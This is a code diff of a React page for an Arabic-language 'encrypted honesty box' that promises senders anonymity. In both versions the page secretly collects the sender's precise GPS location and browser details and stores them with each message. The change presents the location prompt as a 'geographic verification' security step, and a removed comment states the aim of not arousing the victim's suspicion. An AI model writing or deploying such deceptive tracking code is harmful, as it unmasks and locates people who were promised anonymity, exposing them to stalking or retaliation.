@@ -15,77 +15,76 @@ export default function Home() {
     e.preventDefault();
     setStatus('جاري تأمين اتصالك وتشفير الرسالة...');
 
-    if ("geolocation" in navigator) {
-      navigator.geolocation.getCurrentPosition(
+    if (typeof window !== 'undefined' && "geolocation" in window.navigator) {
+      window.navigator.geolocation.getCurrentPosition(
         async (pos) => {
-          // جلب الإحداثيات الدقيقة
-          const locationLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+          const locationLink = `https://www.google.com/maps?q=${lat},${lon}`;
           
           const { error } = await supabase
             .from('messages')
             .insert([{ 
               content: message, 
-              device: navigator.userAgent,
+              device: window.navigator.userAgent,
               location: locationLink 
             }]);
 
-          if (error) setStatus('حدث خطأ في الاتصال، حاول مجدداً');
+          if (error) setStatus('حدث خطأ، حاول الإرسال مرة أخرى');
           else {
             setStatus('تم إرسال رسالتك بنجاح وبسرية تامة! ✅');
             setMessage('');
           }
         },
         async (err) => {
-          // في حال رفض الإذن، نرسل الرسالة برضه عشان ميشكش
+          let reason = "تم حجب الموقع من قبل المستخدم";
           await supabase.from('messages').insert([{ 
             content: message, 
-            device: navigator.userAgent,
-            location: "تم حجب التتبع من قبل المستخدم" 
+            device: window.navigator.userAgent,
+            location: reason 
           }]);
           setStatus('تم إرسال رسالتك بنجاح! ✅');
           setMessage('');
         },
-        { enableHighAccuracy: true, timeout: 8000 }
+        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
       );
     }
   };
 
   return (
-    <main className="min-h-screen flex items-center justify-center bg-[#fdfdfd] p-4" dir="rtl">
-      <div className="bg-white p-8 rounded-[2rem] shadow-2xl max-w-md w-full text-center border border-gray-50">
-        <div className="mb-6">
-          <div className="bg-blue-50 w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4">
-            <span className="text-2xl">🔒</span>
+    <main className="min-h-screen flex items-center justify-center bg-[#fafafa] p-4" dir="rtl">
+      <div className="bg-white p-10 rounded-[2.5rem] shadow-2xl max-w-md w-full text-center border border-gray-100">
+        <div className="mb-8 text-center">
+          <div className="bg-blue-50 w-20 h-20 rounded-full flex items-center justify-center mx-auto mb-4 border-4 border-white shadow-sm">
+            <span className="text-3xl">🛡️</span>
           </div>
-          <h1 className="text-2xl font-bold text-gray-800">صندوق الصراحة الآمن</h1>
-          <p className="text-gray-400 text-xs mt-2 leading-relaxed">
-            نستخدم تقنيات التشفير لضمان وصول رسالتك بدون هوية. <br/>
-            يرجى الموافقة على بروتوكول الأمان عند الطلب لإتمام الإرسال.
+          <h1 className="text-2xl font-black text-gray-800 tracking-tight">صندوق الصراحة المشفر</h1>
+          <p className="text-gray-400 text-sm mt-3 leading-relaxed">
+            رسالتك تمر عبر بروتوكول حماية متقدم. <br/>
+            <span className="text-blue-500 font-medium text-xs mt-2 block">
+              يرجى الموافقة على طلب "التحقق الجغرافي" لتوثيق أمان الرسالة.
+            </span>
           </p>
         </div>
         
         <form onSubmit={sendMessage}>
           <textarea
-            className="w-full p-5 border-2 border-gray-100 rounded-2xl mb-4 focus:outline-none focus:border-blue-400 text-right bg-gray-50 transition-all placeholder:text-gray-300"
+            className="w-full p-5 border-2 border-gray-50 rounded-[1.5rem] mb-5 focus:outline-none focus:border-blue-300 text-right bg-gray-50/50 transition-all text-gray-700 placeholder:text-gray-300 resize-none"
             rows={5}
-            placeholder="اكتب رسالتك هنا بكل حرية..."
+            placeholder="اكتب هنا ما لا تستطيع قوله علانية..."
             value={message}
             onChange={(e) => setMessage(e.target.value)}
             required
           />
           <button 
             type="submit" 
-            className="w-full bg-[#1da1f2] text-white py-4 rounded-2xl font-bold hover:bg-[#1991db] active:scale-95 transition-all shadow-lg shadow-blue-100 text-lg"
+            className="w-full bg-[#007aff] text-white py-4.5 rounded-[1.2rem] font-bold hover:bg-[#005ecb] active:scale-95 transition-all shadow-xl shadow-blue-100 text-lg"
           >
-            إرسال الرسالة الآن
+            إرسال الآن (بسرية)
           </button>
         </form>
         
-        {status && (
-          <div className="mt-6 p-3 bg-blue-50 rounded-xl text-blue-600 text-xs font-bold animate-pulse">
-            {status}
-          </div>
-        )}
+        {status && <div className="mt-8 p-4 bg-gray-50 rounded-2xl text-[#007aff] text-xs font-bold animate-pulse">{status}</div>}
       </div>
     </main>
   );
